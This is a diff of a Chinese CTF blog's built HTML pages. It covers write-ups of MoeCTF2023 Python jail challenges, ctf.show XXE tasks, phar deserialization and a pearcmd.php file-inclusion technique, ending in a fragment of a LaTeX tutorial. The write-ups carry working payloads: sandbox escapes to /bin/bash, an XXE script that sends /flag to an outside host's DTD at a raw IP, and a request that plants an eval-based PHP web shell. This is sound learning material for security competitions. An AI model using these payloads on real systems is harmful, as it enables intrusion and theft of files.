+<p>输入<code>!/bin/bash</code>即可拿shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:!/bin/bash</span><br><span class="line">!/bin/bash</span><br><span class="line">bash: cannot set terminal process group (27): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">ctf@445612fbbffa:~$ ls</span><br><span class="line">flag  server.py</span><br><span class="line">ctf@445612fbbffa:~$ cat flag</span><br><span class="line">flag&#123;xxxxxxxxxxxxx&#125;</span><br><span class="line">ctf@445612fbbffa:~$ </span><br></pre></td></tr></table></figure>
+<h2 id="jail-level-3">Jail Level 3</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">   BANLIST = [<span class="string">&#x27;breakpoint&#x27;</span>]</span><br><span class="line">   BANLIST_WORDS = <span class="string">&#x27;|&#x27;</span>.join(<span class="string">f&#x27;(<span class="subst">&#123;WORD&#125;</span>)&#x27;</span> <span class="keyword">for</span> WORD <span class="keyword">in</span> BANLIST)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">   user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">     <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">     exit(<span class="number">0</span>)</span><br><span class="line">   <span class="keyword">if</span> re.findall(BANLIST_WORDS, user_input_data, re.I):</span><br><span class="line">     <span class="keyword">raise</span> Exception(<span class="string">&#x27;Blacklisted word detected! you are hacker!&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;Answer result: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>限制长度的同时ban了<code>breakpoint</code>，其实可以用unicode绕过。</p>
+<p>可以本地先测试一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Python 3.10.5 (main, Jun  8 2022, 09:26:22) [GCC 11.3.0] on linux</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; breakᵖoint</span><br><span class="line">&lt;built-in function breakpoint&gt;</span><br><span class="line">&gt;&gt;&gt; breakᵖoint()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;stdin&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e</span><br><span class="line">Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">&gt; breakᵖoint()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;xxxxxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="jail-level-4">Jail Level 4</h2>
+<p>其实可以直接拿shell，也可以<code>eval(input())</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the MoeCTF2023 Jail challenge.This is a repeater and it repeats what you say!</span><br><span class="line">python verison:2.7</span><br><span class="line">&gt; eval(input())</span><br><span class="line">__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</span><br><span class="line">bash: cannot set terminal process group (22): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">ctf@0e4e9665e28b:~$ ls</span><br><span class="line">flag  server.py</span><br><span class="line">ctf@0e4e9665e28b:~$ </span><br></pre></td></tr></table></figure>
+<h2 id="leak-level-0">Leak Level 0</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">g</span><br><span class="line"></span><br><span class="line">    fake_key_into_local_but_valid_key_into_remote = &quot;moectfisbestctfhopeyoulikethat&quot;</span><br><span class="line">    print(&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;)</span><br><span class="line">    print(&quot;| Options: </span><br><span class="line">|       [V]uln </span><br><span class="line">|       [B]ackdoor&quot;)</span><br><span class="line">    def func_filter(s):</span><br><span class="line">      not_allowed = set(&#x27;vvvveeee&#x27;)</span><br><span class="line">      return any(c in not_allowed for c in s)</span><br><span class="line">    while(1):</span><br><span class="line">      challenge_choice = input(&quot;&gt;&gt;&gt; &quot;).lower().strip()</span><br><span class="line">      if challenge_choice == &#x27;v&#x27;:</span><br><span class="line">        code = input(&quot;code &gt;&gt; &quot;)</span><br><span class="line">        if(len(code)&gt;9):</span><br><span class="line">          print(&quot;you&#x27;re hacker!&quot;)</span><br><span class="line">          exit(0)</span><br><span class="line">        if func_filter(code):</span><br><span class="line">          print(&quot;Oh hacker! byte~&quot;)</span><br><span class="line">          exit(0)</span><br><span class="line">        print(eval(code))</span><br><span class="line">      elif challenge_choice == &#x27;b&#x27;:</span><br><span class="line">        print(&quot;Please enter the admin key&quot;)</span><br><span class="line">        key = input(&quot;key &gt;&gt; &quot;)</span><br><span class="line">        if(key == fake_key_into_local_but_valid_key_into_remote):</span><br><span class="line">          print(&quot;Hey Admin,please input your code:&quot;)</span><br><span class="line">          code = input(&quot;backdoor &gt;&gt; &quot;)</span><br><span class="line">          print(eval(code))</span><br><span class="line">      else:</span><br><span class="line">        print(&quot;You should select valid choice!&quot;)</span><br></pre></td></tr></table></figure>
+<p>简而言之，我们需要找到一个key，然后通过这个key进入backdoor执行命令。</p>
+<p>同样可以用unicode绕过<code>ᵉ</code>，或者用<code>dir()</code>也可以</p>
+<p>先进入help(),然后查看<code>__main__</code> 的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">help&gt; main</span><br><span class="line">No Python documentation found for &#x27;main&#x27;.</span><br><span class="line">Use help() to get the interactive help utility.</span><br><span class="line">Use help(str) for help on the str class.</span><br><span class="line"></span><br><span class="line">help&gt; __main__</span><br><span class="line">Help on module __main__:</span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">    __main__</span><br><span class="line"></span><br><span class="line">FUNCTIONS</span><br><span class="line">    func_filter(s)</span><br><span class="line"></span><br><span class="line">DATA</span><br><span class="line">    CHALLENGE_SOURCE_CODE = &#x27;\n    fake_key_into_local_but_valid_key_into_...</span><br><span class="line">    WELCOME = &#x27;\n  __  __  ___       _      ______        _  __ ...       ...</span><br><span class="line">    __annotations__ = &#123;&#125;</span><br><span class="line">    challenge_choice = &#x27;v&#x27;</span><br><span class="line">    choice = &#x27;e&#x27;</span><br><span class="line">    code = &#x27;hᵉlp()&#x27;</span><br><span class="line">    key_6366a131649a4e9b = &#x27;4e86eda06366a131649a4e9be1a9f217&#x27;</span><br><span class="line">    # 这个就是我们要找的key</span><br><span class="line"></span><br><span class="line">FILE</span><br><span class="line">    /home/ctf/server.py</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>输入以后执行命令即可。</p>
+<h2 id="leak-level-1">Leak Level 1</h2>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">   fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;moe_dbt&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|       [V]uln </span></span><br><span class="line"><span class="string">|       [B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_vailed_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor &gt;&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>用上一个的方法还是可以的。</p>
+<h2 id="leak-leval-2">Leak Leval 2</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">fake_key_into_local_but_valid_key_into_remote = <span class="string">&quot;moectfisbestctfhopeyoulikethat&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hey Guys,Welcome to the moeleak challenge.Have fun!.&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;| Options: </span></span><br><span class="line"><span class="string">|       [V]uln </span></span><br><span class="line"><span class="string">|       [B]ackdoor&quot;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">func_filter</span>(<span class="params">s</span>):</span><br><span class="line">      not_allowed = <span class="built_in">set</span>(<span class="string">&#x27;dbtaaaaaaaaa!&#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">any</span>(c <span class="keyword">in</span> not_allowed <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">      challenge_choice = <span class="built_in">input</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>).lower().strip()</span><br><span class="line">      <span class="keyword">if</span> challenge_choice == <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you need to &quot;</span>)</span><br><span class="line">        code = <span class="built_in">input</span>(<span class="string">&quot;code &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(code)&gt;<span class="number">6</span>):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;you&#x27;re hacker!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> func_filter(code):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! byte~&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> code.isascii():</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;please use ascii only thanks!&quot;</span>)</span><br><span class="line">          exit(<span class="number">0</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">elif</span> challenge_choice == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Please enter the admin key&quot;</span>)</span><br><span class="line">        key = <span class="built_in">input</span>(<span class="string">&quot;key &gt;&gt; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span>(key == fake_key_into_local_but_vailed_key_into_remote):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;Hey Admin,please input your code:&quot;</span>)</span><br><span class="line">          code = <span class="built_in">input</span>(<span class="string">&quot;backdoor&gt; &quot;</span>)</span><br><span class="line">          <span class="built_in">print</span>(<span class="built_in">eval</span>(code))</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;You should select valid choice!&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>不让我们用unicode，但是把e放出来了，直接<code>help()</code>拿key。</p>
 
       
     </div>
@@ -291,9 +565,9 @@
 </blockquote>
 <h2 id="实体类别介绍">实体类别介绍</h2>
 <p>实体主要分为以下四类 * 内置实体 * 字符实体 * 通用实体 * 参数实体</p>
-<p>参数实体用%实体名称申明，引用时也用%实体名称<br>
-其余实体直接用实体名称申明，使用时用&amp;实体名称<br>
-参数实体只能在DTD中申明，DTD中引用<br>
+<p>参数实体用%实体名称申明，引用时也用%实体名称<br />
+其余实体直接用实体名称申明，使用时用&amp;实体名称<br />
+参数实体只能在DTD中申明，DTD中引用<br />
 其余实体只能在DTD中申明，可在xml文档中引入</p>
 <p>注意：<strong>参数实体是在DTD中被引用的，而其余实体是在xml文档中被引入的</strong></p>
 <h1 id="dtd实体声明">DTD实体声明</h1>
@@ -326,7 +600,7 @@ nMask，说明xml文件可以被解析。</p>
 <p>第二步检测服务器是否支持DTD引用外部实体： <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">name</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost/index.html&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%name; </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="php代码层面">PHP代码层面</h2>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);  <span class="comment">//获取提交的XML数据</span></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>);  <span class="comment">// 交给PHP的XML解析函数</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xml</span>-&gt;name;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给xml变量。<br>
+<p>最开始，引入一个<code>file_get_contents</code>函数，将整个XML数据读入<code>data</code>字符串中，然后交给php的xml解析函数<code>simplexml_load_string()</code>解析，解析后的数据赋给xml变量。<br />
 这一数据即XML字符串中使用的对象(或者说根元素)的数据，并echo输出出来。</p>
 <h1 id="例题">例题</h1>
 <h2 id="web373">web373</h2>
@@ -340,7 +614,7 @@ nMask，说明xml文件可以被解析。</p>
 <h2 id="web377">web377</h2>
 <p>对http进行了过滤，但我们可以通过utf-16编码绕过 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://6e07c613-d190-40c1-a22d-b8ee5f5569a3.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;&lt;!DOCTYPE test [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % aaa SYSTEM &quot;http://45.76.194.53:8080/text.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%aaa;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;123&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">payload = payload.encode(<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line">requests.post(url, data=payload)</span><br></pre></td></tr></table></figure></p>
 <h2 id="web378">web378</h2>
-<p><img src="https://s3.bmp.ovh/imgs/2023/08/07/53a3a5ac1abc0001.png">
+<p><img src="https://s3.bmp.ovh/imgs/2023/08/07/53a3a5ac1abc0001.png" />
 一看就是传了一个xml，直接在DTD中包含flag即可 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;flag;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 
       
@@ -411,14 +685,14 @@ nMask，说明xml文件可以被解析。</p>
       
           <h1 id="phar文件结构">phar文件结构</h1>
 <ol type="1">
-<li><p>stub<br>
+<li><p>stub<br />
 一个标志，格式为<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>,必须以<code>__HALT_COMPILER();</code>结尾，否则phar扩展将无法识别这个文件为phar文件。</p></li>
-<li><p>a manifest describing the contents<br>
+<li><p>a manifest describing the contents<br />
 phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p></li>
-<li><p>the file contents<br>
+<li><p>the file contents<br />
 被压缩文件的内容</p></li>
 <li><p>[optional] a signature for verifying Phar integrity (phar file
-format only)<br>
+format only)<br />
 签名，放在文件末尾</p></li>
 </ol>
 <h1 id="生成phar文件">生成phar文件</h1>
@@ -427,10 +701,12 @@ format only)<br>
 <h1 id="伪造其他格式的文件">伪造其他格式的文件</h1>
 <p>phar必须以<code>__HALT_COMPILER();?</code>来结尾，我们可以通过在它前面添加文件头
 + 修改后缀的方式将phar文件伪装成其他格式的文件。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br></pre></td></tr></table></figure>
-最后的效果 <img src="https://s3.bmp.ovh/imgs/2023/07/25/2423dc3dd366ebba.png"></p>
+最后的效果 <img
+src="https://s3.bmp.ovh/imgs/2023/07/25/2423dc3dd366ebba.png" /></p>
 <h1 id="触发反序列化的文件操作函数">触发反序列化的文件操作函数</h1>
 <p>以下的文件系统函数在通过<code>phar://</code>伪协议解析<code>phar</code>文件时，都会将<code>meta-data</code>进行反序列化
-<img src="https://s3.bmp.ovh/imgs/2023/07/25/a25c022eaddbb7af.png"></p>
+<img
+src="https://s3.bmp.ovh/imgs/2023/07/25/a25c022eaddbb7af.png" /></p>
 <p>如果限制<code>phar://</code>不能出现在头几个字符，可以用<code>Bzip / Gzip</code>协议绕过
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$filename = &#x27;compress.zlib://phar://phar.phar/test.txt&#x27;;</span><br></pre></td></tr></table></figure> 同样适用于<code>compress.bzip2://</code></p>
 
@@ -504,21 +780,23 @@ format only)<br>
 <p>安装了pear扩展 php开启了<code>register_argc_argv</code>选项</p>
 <p>docker中默认都开启</p>
 <h1 id="register_argc_argv">register_argc_argv</h1>
-<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png">
+<p><img src="https://s3.bmp.ovh/imgs/2023/07/28/8fbcac33456cc860.png" />
 在命令行模式下获取传入的参数，在web服务的情况下获取url中<code>?</code>后面的内容，<em><strong>无论是否有<code>=</code>号</strong>
-<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png">
-<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png">
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/def0c651719cd2db.png" />
+<img src="https://s3.bmp.ovh/imgs/2023/07/28/44555fc9f3043dbf.png" />
 在web中传参有几点需要注意的： </em>
 <code>=</code>和<code>&amp;</code>会被当成字符串解析 *
 每个参数之间需要使用<code>+</code>分割，不能使用空格 *
-它的解析不影响正常的GET传参 <img src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png"></p>
+它的解析不影响正常的GET传参 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/fbd8e7bc4f0bc9c6.png" /></p>
 <h1 id="pearcmd.php">pearcmd.php</h1>
 <p>一般在docker中的默认安装目录为<code>/usr/local/lib/php</code>,也有可能因为版本不同在<code>/usr/share/php/pearcmd.php</code></p>
 <p>pear/pcel是一个命令行工具。如果我们能够包含其中的文件，并控制输入的参数，就可以通过它执行命令。</p>
 <h2 id="config-create">config-create</h2>
-<p>创建配置文件，可以在不出网的情况下挂马。<br>
+<p>创建配置文件，可以在不出网的情况下挂马。<br />
 第一个参数为写入的内容，但必须以<code>/</code>开头，第二个参数为写入文件的路径。
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@eval($_POST[&#x27;cmd&#x27;]);?&gt;+/tmp/test.php</span><br></pre></td></tr></table></figure> 发送时需要抓包发送，不然会被url编码 <img
+src="https://s3.bmp.ovh/imgs/2023/07/28/a57d4a9d1ba01220.png" />
 然后包含<code>/tmp/test.php</code>就可以RCE了</p>
 <h2 id="install">install</h2>
 <p>需要靶机出网 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear install http://[vps]:[port]/test1.php</span><br></pre></td></tr></table></figure>
@@ -620,9 +898,11 @@ x&#39;&#39;_{12} \]</span></p>
 \sqrt{y}} = \sqrt[3]{k_i} - \frac{x}{m} \]</span></p>
 <h2 id="上下标记">上下标记</h2>
 <p>命令：<code>\overline</code>, <code>\underline</code>
-分别在表达式上、下方画出水平线 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \overline&#123;x+y&#125; \qquad \underline&#123;a+b&#125; $$</span><br></pre></td></tr></table></figure> <span class="math display">\[ \overline{x+y} \qquad \underline{a+b}
+分别在表达式上、下方画出水平线 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$ \overline&#123;x+y&#125; \qquad \underline&#123;a+b&#125; $$</span><br></pre></td></tr></table></figure> <span
